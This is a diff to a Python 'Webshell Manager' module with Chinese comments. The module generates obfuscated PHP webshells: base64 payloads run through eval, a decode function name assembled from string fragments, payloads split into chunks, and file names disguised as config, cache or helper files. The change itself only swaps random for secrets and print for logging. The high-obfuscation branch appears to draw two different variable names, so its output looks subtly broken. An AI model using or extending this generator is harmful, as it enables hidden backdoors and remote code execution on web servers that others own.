@@ -7,6 +7,7 @@ Webshell 管理模块 - Webshell Manager
 
 import base64
 import random
+import secrets
 import string
 import hashlib
 import os
@@ -71,14 +72,12 @@ class WebshellGenerator:
     """
 
     def __init__(self):
-        self._random_seed = ''.join(random.choices(string.ascii_letters, k=8))
+        self._random_seed = ''.join(secrets.choice(string.ascii_letters) for _ in range(8))
 
     def _generate_password(self, length: int = 12) -> str:
-        """生成随机密码"""
-        return ''.join(random.choices(
-            string.ascii_letters + string.digits,
-            k=length
-        ))
+        """生成密码学安全的随机密码"""
+        charset = string.ascii_letters + string.digits
+        return ''.join(secrets.choice(charset) for _ in range(length))
 
     def _generate_filename(self, extension: str) -> str:
         """生成随机文件名"""
@@ -86,7 +85,7 @@ class WebshellGenerator:
             "config", "settings", "cache", "temp", "log", "data",
             "helper", "util", "common", "core", "base", "init"
         ]
-        return f"{random.choice(names)}_{self._random_seed[:4]}.{extension}"
+        return f"{secrets.choice(names)}_{self._random_seed[:4]}.{extension}"
 
     def _obfuscate_php(self, code: str, level: ObfuscationLevel) -> str:
         """PHP 代码混淆"""
@@ -101,8 +100,8 @@ class WebshellGenerator:
         if level == ObfuscationLevel.MEDIUM:
             # 变量混淆 + Base64
             encoded = base64.b64encode(code.encode()).decode()
-            var1 = ''.join(random.choices(string.ascii_lowercase, k=6))
-            var2 = ''.join(random.choices(string.ascii_lowercase, k=6))
+            var1 = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(6))
+            var2 = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(6))
             return f"""<?php
 ${var1} = 'base'.'64_'.'decode';
 ${var2} = ${var1}('{encoded}');
@@ -114,7 +113,7 @@ eval(${var2});
             encoded = base64.b64encode(code.encode()).decode()
             # 字符分割
             chunks = [encoded[i:i+10] for i in range(0, len(encoded), 10)]
-            var_prefix = ''.join(random.choices(string.ascii_lowercase, k=3))
+            var_prefix = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(3))
 
             vars_def = []
             vars_concat = []
@@ -125,8 +124,8 @@ eval(${var2});
 
             return f"""<?php
 {';'.join(vars_def)};
-${''.join(random.choices(string.ascii_lowercase, k=4))}={'.'.join(vars_concat)};
-@eval(@base64_decode(${''.join(random.choices(string.ascii_lowercase, k=4))}));
+${''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}={'.'.join(vars_concat)};
+@eval(@base64_decode(${''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}));
 ?>"""
 
         return code
@@ -640,8 +639,11 @@ def list_webshell_types() -> List[Dict[str, str]]:
 
 
 if __name__ == "__main__":
-    print("Webshell Generator Module")
-    print("=" * 50)
-    print("\nAvailable types:")
+    # 配置测试用日志
+    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+
+    logger.info("Webshell Generator Module")
+    logger.info("=" * 50)
+    logger.info("Available types:")
     for t in list_webshell_types():
-        print(f"  {t['type']}: {t['description']} (variants: {t['variants']})")
+        logger.info(f"  {t['type']}: {t['description']} (variants: {t['variants']})")
